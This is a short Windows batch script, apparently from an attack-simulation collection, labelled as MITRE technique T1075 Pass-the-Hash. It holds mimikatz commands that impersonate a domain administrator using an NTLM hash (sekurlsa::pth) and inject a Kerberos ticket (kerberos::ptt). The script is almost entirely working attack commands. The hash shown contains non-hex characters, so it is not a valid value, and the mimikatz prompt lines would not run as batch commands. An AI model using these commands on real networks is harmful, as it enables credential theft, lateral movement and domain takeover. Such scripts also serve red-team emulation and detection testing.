@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Pass-the-Hash using minikatz	(T1075)
ECHO.
ECHO [+] PTH using 'MIMIKATZ' 
ECHO -------------------------------------------------------------------
mimikatz # sekurlsa::pth /user:administrator /ntlm:cc36cf7a8514893efccd3324464tkg1a
mimikatz # kerberos::ptt administrator@aria.com
ECHO.

